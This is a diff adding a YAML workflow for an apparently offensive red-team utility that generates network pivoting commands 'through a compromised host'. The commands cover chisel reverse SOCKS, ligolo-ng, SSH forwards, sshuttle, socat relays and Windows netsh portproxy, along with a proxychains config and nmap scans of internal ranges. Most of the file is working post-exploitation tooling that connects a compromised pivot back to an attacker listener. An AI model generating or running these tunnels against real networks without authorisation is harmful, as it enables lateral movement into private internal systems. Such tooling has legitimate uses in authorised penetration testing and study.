@@ -1,0 +1,127 @@
+name: network-tunnel
+description: |
+  Network tunnel and pivot utility — generate chisel, ligolo, SSH tunnel,
+  socat, and other pivoting commands for accessing internal networks
+  through a compromised host.
+tags: [utility, pivoting, tunnel, network, redteam]
+dispatch:
+  inputs:
+    lhost:
+      required: true
+      type: string
+      description: Attacker/listener IP
+    rhost:
+      required: true
+      type: string
+      description: Compromised pivot host IP
+    target_net:
+      type: string
+      default: '10.0.0.0/24'
+      description: Internal target network
+    lport:
+      type: string
+      default: '8080'
+      description: Listener port
+
+jobs:
+  generate:
+    name: Generate Tunnel Commands
+    steps:
+    - name: gen-tunnels
+      script: |
+        lhost = '{{ inputs.lhost }}'
+        rhost = '{{ inputs.rhost }}'
+        target_net = '{{ inputs.target_net }}'
+        lport = '{{ inputs.lport }}'
+
+        tunnels = {}
+
+        # Chisel
+        tunnels['chisel_reverse_socks'] = {
+            'desc': 'Chisel reverse SOCKS proxy (most reliable)',
+            'server': f'chisel server -p {lport} --reverse',
+            'client': f'chisel client {lhost}:{lport} R:1080:socks',
+            'usage': f'proxychains nmap -sT {target_net}',
+        }
+        tunnels['chisel_port_forward'] = {
+            'desc': 'Chisel port forward specific port',
+            'server': f'chisel server -p {lport} --reverse',
+            'client': f'chisel client {lhost}:{lport} R:8888:{target_net.split("/")[0]}:80',
+        }
+
+        # Ligolo-ng
+        tunnels['ligolo'] = {
+            'desc': 'Ligolo-ng double pivot (high performance)',
+            'server': f'ligolo-proxy -selfcert -laddr 0.0.0.0:{lport}',
+            'client': f'ligolo-agent -connect {lhost}:{lport} -retry -ignore-cert',
+            'setup': f'# On proxy: session → ifconfig → start\n  sudo ip route add {target_net} dev ligolo',
+        }
+
+        # SSH tunnels
+        tunnels['ssh_dynamic'] = {
+            'desc': 'SSH dynamic SOCKS proxy',
+            'cmd': f'ssh -D 1080 -N -f user@{rhost}',
+            'usage': f'proxychains nmap -sT {target_net}',
+        }
+        tunnels['ssh_local_forward'] = {
+            'desc': 'SSH local port forward',
+            'cmd': f'ssh -L 8888:{target_net.split("/")[0]}:80 -N user@{rhost}',
+        }
+        tunnels['ssh_remote_forward'] = {
+            'desc': 'SSH remote port forward (reverse)',
+            'cmd': f'ssh -R {lport}:localhost:22 user@{lhost}',
+        }
+        tunnels['sshuttle'] = {
+            'desc': 'sshuttle (transparent proxy, no SOCKS needed)',
+            'cmd': f'sshuttle -r user@{rhost} {target_net} -v',
+        }
+
+        # Socat
+        tunnels['socat_relay'] = {
+            'desc': 'Socat TCP relay',
+            'cmd': f'socat TCP-LISTEN:{lport},fork TCP:{target_net.split("/")[0]}:80',
+        }
+
+        # Netsh (Windows)
+        tunnels['netsh_portproxy'] = {
+            'desc': 'Windows netsh port proxy',
+            'cmd': f'netsh interface portproxy add v4tov4 listenport={lport} listenaddress=0.0.0.0 connectport=80 connectaddress={target_net.split("/")[0]}',
+            'cleanup': f'netsh interface portproxy delete v4tov4 listenport={lport} listenaddress=0.0.0.0',
+        }
+
+        # Proxychains config
+        proxychains_conf = f'''# proxychains.conf for tunnel
+        strict_chain
+        proxy_dns
+        [ProxyList]
+        socks5 127.0.0.1 1080'''
+
+        print(f"=== NETWORK TUNNELS ===")
+        print(f"  Attacker: {lhost}")
+        print(f"  Pivot: {rhost}")
+        print(f"  Target: {target_net}\n")
+
+        for name, info in tunnels.items():
+            print(f"--- {name} ---")
+            print(f"  {info['desc']}")
+            for key, val in info.items():
+                if key != 'desc':
+                    print(f"  [{key}]: {val}")
+            print()
+
+        print("--- proxychains.conf ---")
+        print(proxychains_conf)
+
+        from pathlib import Path
+        out = '/tmp/ofx_tunnels.txt'
+        with open(out, 'w') as f:
+            for name, info in tunnels.items():
+                f.write(f"=== {name} ===\n")
+                for key, val in info.items():
+                    f.write(f"  {key}: {val}\n")
+                f.write("\n")
+
+        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+            f.write(f"tunnels_file={out}\n")
+            f.write(f"tunnel_count={len(tunnels)}\n")
+      log-stdout: true
